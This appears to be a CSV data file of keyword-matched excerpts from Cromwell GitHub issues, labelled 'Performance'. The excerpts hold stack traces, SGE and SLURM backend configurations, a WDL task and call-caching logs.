Performance,"; at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-3"" #29 daemon prio=5 os_prio=31 tid=0x00007fb76f4b7000 nid=0x7f03 waiting on condition [0x000000012c88c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-2"" #28 daemon prio=5 os_prio=31 tid=0x00007fb7708d7800 nid=0x7d03 waiting on condition [0x000000012c789000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueued",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:37643,concurren,concurrent,37643,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,; at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Even,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4756,concurren,concurrent,4756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['concurren'],['concurrent']
Performance,; at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Succeeded; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdlAndAssertOutputs$1(CromwellTestKitSpec.scala:344); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalat,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4457:4905,concurren,concurrent,4905,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4457,1,['concurren'],['concurrent']
Performance,"; at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5482,concurren,concurrent,5482,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,"; at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala:29); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala:433); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala); at scala.concurrent.impl.CallbackRunnable.run(Redefined); at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(Redefined); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java). ""cromwell-system-scheduler-1"" #14 prio=5 os_prio=31 tid=0x00007fb76aa14800 nid=0x6103 runnable [0x00000001295b3000]; java.lang.Thread.State: RUNNABLE; at com.jprofiler.agent.InstrumentationCallee.exitFilteredMethod(Native Method); at com.jprofiler.agent.InstrumentationCallee.__ejt_filter_exitMethod(ejt:86); at akka.actor.LightArrayRevolverScheduler.clock(Scheduler.scala:213); at akka.actor.LightArrayRevolverScheduler$$anon$8.nextTick(Redefined); at akka.actor.LightArrayRevolverScheduler$$anon$8.run(Redefined); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.actor.default-dispatcher-4"" #13 prio=5 os_prio",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:46207,concurren,concurrent,46207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hit"": false,; ""result"": ""Cache Miss""; },; ```. ```; # simple sge apptainer conf (modified from the slurm one); #; workflow-options; {; workflow-log-dir: ""cromwell-workflow-logs""; workflow-log-temporary: false; workflow-failure-mode: ""ContinueWhilePossible""; default; {; workflow-type: WDL; workflow-type-version: ""draft-2""; }; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; metadata {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql:<dburl>?rewriteBatchedStatements=true""; driver = ""com.mysql.cj.jdbc.Driver""; user = ""<user>""; password = ""<pass>"" ; connectionTimeout = 5000; }; }; }. call-caching; {; enabled = true; invalidate-bad-cache-result = true; }. docker {; hash-lookup {; enabled = true; }; }. backend {; default = sge; providers {. ; sge {; 	actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; #concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". submit-docker = """""" ; #location for .sif files and other apptainer tmp, plus lockfile; 	 export APPTAINER_CACHED",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:2374,concurren,concurrent,2374,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,2,['concurren'],"['concurrent', 'concurrent-job-limit']"
Performance,"; }. task CallModeledSegments {; String entity_id; File modeled_segments_input_file; Boolean? load_copy_ratio; Boolean? load_allele_fraction; File? output_dir; String? output_prefix; Float? normal_minor_allele_fraction_threshold; Float? copy_ratio_peak_min_weight; Float? min_fraction_of_points_in_normal_allele_fraction_region; File? gatk4_jar_override. # Runtime parameters; String gatk_docker; Int? mem_gb; Int? disk_space_gb; Boolean use_ssd = false; Int? cpu; Int? preemptible_attempts. Int machine_mem_mb = select_first([mem_gb, 7]) * 1000; Int command_mem_mb = machine_mem_mb - 1000. String output_dir_ = select_first([output_dir, ""out/""]); String output_prefix_ = select_first([output_prefix, entity_id]). command <<<; set -e; mkdir ${output_dir_}; export GATK_LOCAL_JAR=${default=""/root/gatk.jar"" gatk4_jar_override}. gatk --java-options ""-Xmx${command_mem_mb}m"" CallModeledSegments \; --input ${modeled_segments_input_file} \; --load-copy-ratio ${default=""true"" load_copy_ratio} \; --load-allele-fraction ${default=""true"" load_allele_fraction} \; --output ${output_dir_} \; --output-prefix ${output_prefix_} \; --normal-minor-allele-fraction-threshold ${default=""0.475"" normal_minor_allele_fraction_threshold} \; --copy-ratio-peak-min-weight ${default=""0.03"" copy_ratio_peak_min_weight} \; --min-fraction-of-points-in-normal-allele-fraction-region ${default=""0.15"" min_fraction_of_points_in_normal_allele_fraction_region}; >>>. runtime {; docker: ""${gatk_docker}""; memory: machine_mem_mb + "" MB""; disks: ""local-disk "" + disk_space_gb + if use_ssd then "" SSD"" else "" HDD""; cpu: select_first([cpu, 1]); preemptible: select_first([preemptible_attempts, 5]); }. output {; File called_modeled_segments_data = ""${output_dir_}${output_prefix_}.called.seg""; }; }. task PlotDenoisedCopyRatios {; String entity_id; File standardized_copy_ratios; File denoised_copy_ratios; File ref_fasta_dict; Int? minimum_contig_length; String? output_dir; File? gatk4_jar_override. # Runtime parameters; String gatk",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669:27740,load,load-copy-ratio,27740,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3618#issuecomment-388871669,2,['load'],"['load-allele-fraction', 'load-copy-ratio']"
Performance,"; }; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; default = slurm. # The list of providers.; providers {; # Copy paste the contents of a backend provider in this section; # Examples in cromwell.example.backends include:; # LocalExample: What you should use if you want to define a new backend provider; # AWS: Amazon Web Services; # BCS: Alibaba Cloud Batch Compute; # TES: protocol defined by GA4GH; # TESK: the same, with kubernetes support; # Google Pipelines, v2 (PAPIv2); # Docker; # Singularity: a container safe for HPC; # Singularity+Slurm: and an example on Slurm; # udocker: another rootless container solution; # udocker+slurm: also exemplified on slurm; # HtCondor: workload manager at UW-Madison; # LSF: the Platform Load Sharing Facility backend; # SGE: Sun Grid Engine; # SLURM: workload manager. # Note that these other backend examples will need tweaking and configuration.; # Please open an issue https://www.github.com/broadinstitute/cromwell if you have any questions; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; # Root directory where Cromwell writes job results in the container. This value; # can be used to specify where the execution folder is mounted in the container.; # it is used for the construction of the docker_cwd string in the submit-docker; # value above.; dockerRoot = ""/cromwell-executions"". concurrent-job-limit = 10; # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:5882,Load,Load,5882,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['Load'],['Load']
Performance,"<!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; Bug is full covered here:; https://github.com/sbt/sbt/issues/7117. The error I was getting was this:; ```; Exception in thread ""sbt-socket-server"" java.lang.NoClassDefFoundError: Could not initialize class org.scalasbt.ipcsocket.JNIUnixDomainSocketLibraryProvider; 	at org.scalasbt.ipcsocket.UnixDomainSocketLibraryProvider.get(UnixDomainSocketLibraryProvider.java:26); 	at org.scalasbt.ipcsocket.UnixDomainSocketLibraryProvider.maxSocketLength(UnixDomainSocketLibraryProvider.java:31); 	at sbt.internal.server.Server$$anon$1$$anon$2.$anonfun$run$1(Server.scala:75); 	at scala.util.Try$.apply(Try.scala:213); 	at sbt.internal.server.Server$$anon$1$$anon$2.run(Server.scala:63); Caused by: java.lang.ExceptionInInitializerError: Exception java.lang.UnsatisfiedLinkError: darwin/aarch64/libsbtipcsocket.dylib not found on classpath [in thread ""main""]; ```; <!-- Which backend are you running? -->; This was trying to load set 1.10.2 in the cromwell directory. So I edited project/build.properties to have. sbt.version=1.8.2. And everything worked. Share I submit a PR with that change?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7564:1020,load,load,1020,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7564,1,['load'],['load']
Performance,"<!-- Which backend are you running? -->; Backend: AWS backend. Link to Jira: https://broadworkbench.atlassian.net/browse/CROM-6712. Issue: ; From time to time I get the following error running a workflow on AWS. ```java; Could not build the path \""s3://bean-cromwell/cromwell-execution\"". It may refer to a filesystem not supported by this instance of Cromwell. Supported filesystems are: s3. Failures: \ns3: Unable to load region from any of the providers in the chain software.amazon.awssdk.regions.providers.DefaultAwsRegionProviderChain@7c812b7e: [software.amazon.awssdk.regions.providers.SystemSettingsRegionProvider@759440a5: Unable to load region from system settings. Region must be specified either via environment variable (AWS_REGION) or system property (aws.region)., software.amazon.awssdk.regions.providers.AwsProfileRegionProvider@2a8c03c1: No region provided in profile: default, software.amazon.awssdk.regions.providers.InstanceProfileRegionProvider@1bafe7dd: Unable to contact EC2 metadata service.] (SdkClientException)\n Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems""; ```. This usually happens to one task generated from a scatter task.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6233:419,load,load,419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6233,2,['load'],['load']
Performance,"<!-- Which backend are you running? -->; SGE. conf:; ```; include required(classpath(""application"")). call-caching {; enabled = true; invalidate-bad-cache-results = true; }; workflow-options {; workflow-log-temporary = false; }; backend {; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; filesystems {; local {; caching {; # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:; duplication-strategy: [; ""soft-link"", ""copy""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; # Default: file; hashing-strategy: ""path""; }; }; }; ...; backend.default = SGE; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql://0.0.0.0:40001/testuser_db?useSSL=false&rewriteBatchedStatements=true""; user = ""fake""; password = ""fake""; driver = ""com.mysql.jdbc.Driver""; connectionTimeout = 5000; }; }. system {; # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; lines = 128000000; string = 128000000; json = 128000000; tsv = 128000000; map = 128000000; object = 128000000; }; }. ```. <!-- Paste/Attach your workflow if possible: -->; a modified version of : https://github.com/gatk-workflows/gatk4-data-processing. [workflow.0263ce1e-e1da-44c4-a49f-56fea7a6e1ea.log](https://github.com/broadinstitute/cromwell/files/2143529/workflow.0263ce1e-e1da-44c4-a49f-56fea7a6e1ea.log). A workflow is failing. It looks like cromwell attempts to localise some folder, ; ```/share/ScratchGeneral/evaben/cromwell/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/0263ce1e-e1da-44c4-a49f-56fea7a6e1ea/call-SamToFastqAndBwaMem/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3825:149,cache,cache-results,149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3825,2,['cache'],"['cache-results', 'cached']"
Performance,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. If you see I've configured root to be root = ""/fast/gdr/uat/cromwell-executions"". but randomly sometime workflows when I check cromwell api metadata it is pointing to old root which was /g/cromwell/cromwell-executions. . Note I'm running cromwell in server mode with mariadb. I've cleaned and deleted all tables from mariadb. restarted the server as well. Can't find any other config/cache file where it has saved old address. Sometime workflows are fine pointing to new root but sometime not. <!-- Which backend are you running? -->; SLURM on cromwell 36. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. backend {; # Override the default backend.; default = ""PhoenixSLURM"". # The list of providers.; providers {. PhoenixSLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String userid; String partitions; String memory_per_node; Int nodes; Int cores; String time; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). exit-code-ti",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4404:986,cache,cache,986,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4404,1,['cache'],['cache']
Performance,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; I `docker load` a image locally on my device, found that there is no digest of it. ; No internet connection, but with docker-loaded images, how can I run docker image locally?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6940:686,load,load,686,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6940,2,['load'],"['load', 'loaded']"
Performance,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->; This is a remark on https://github.com/broadinstitute/cromwell/blob/master/docs/tutorials/HPCSlurmWithLocalScratch.md there is a feature on slum config to edit the sbatch command. You could add in a find and replace in the config to do the same as the tutorial. you can skip the first part of the tutorial by editing the slurm backend config (somewhat hotpatching the scripts on submission time). old submit ; submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". new submit for slurm auto configured job dir: ; submit = """"""; perl -i.bak -wpe 's/^tmpDir=.*/tmpdir=""\$TMPDIR""/g' ${script} && \; sbatch -J ${job_name} --tmp=${disk} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". new submit for /genomics/local/ (not tested tough): ; submit = """"""; perl -i.bak -wpe 's/^tmpDir=.*/tmpdir=""$(mkdir -p ""\/genomics_local\/\$PID_\$HOSTNAME""\/"" && echo ""\/genomics_local\/\$PID_\$HOSTNAME""\/""/g' ${script} && \; sbatch -J ${job_name} --tmp=${disk} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; <!-- This is a clear feature cant you see -->. <!-- Which backend are you running? -->; The backend I'm running on is Slurm hpc with a version 1.0 workflow. This alternative workflow has its downsides but also benefits it is up to the hpc(user) to decide ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7357:869,queue,queue,869,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7357,1,['queue'],['queue']
Performance,"<script type=""text/javascript"" src=""https://www.gstatic.com/charts/loader.js""></script>; . I am proposing to update workflow timing web page as the google timeline chart codes have been revised. Here the current code uses 'http://www.google.com/jsapi' (https://github.com/broadinstitute/cromwell/blob/c8bf8fdc51e2df19d8e8a3d066acc64f588f1b1c/engine/src/main/resources/workflowTimings/workflowTimings.html#L4). It is not suggested by Google Chart documentation (https://developers.google.com/chart/interactive/docs/gallery/timeline), and this URL is blocked by our firewall. In order to use cromwell timing API for myself, I suggest to change relevant lines to:. <script type=""text/javascript"" src=""https://www.gstatic.com/charts/loader.js""></script>; <script src=""https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js""></script>; <script type=""text/javascript"">. var parentWorkflowNames = [];; var expandedParentWorkflows = [];; var chartView;; google.charts.load('current', {packages: ['timeline']});; google.charts.setOnLoadCallback(drawChart);. Can you update cromwell source codes to do that? Or please let me know if you need a pull request. Thanks.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3887:67,load,loader,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3887,3,['load'],"['load', 'loader']"
Performance,"= 8BB8C81C27BFD2533FC9743A70F55DB1, file = 51C3D11209F9A7985345B2FD76E1C699.; [2022-12-15 21:28:23,82] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:4:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,86] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:0:1-20000000038 [788d8048main.all_qced_sample_lists:0:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,86] [info] BT-322 788d8048:main.all_qced_sample_lists:0:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 801EC388A847FBAB78685AE96643853A.; [2022-12-15 21:28:23,86] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:0:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:26,54] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results retrieved (CallCached): 'main.all_qced_sample_lists' (scatter index: Some(5), attempt 1); [2022-12-15 21:28:26,54] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results retrieved (CallCached): 'main.all_qced_sample_lists' (scatter index: 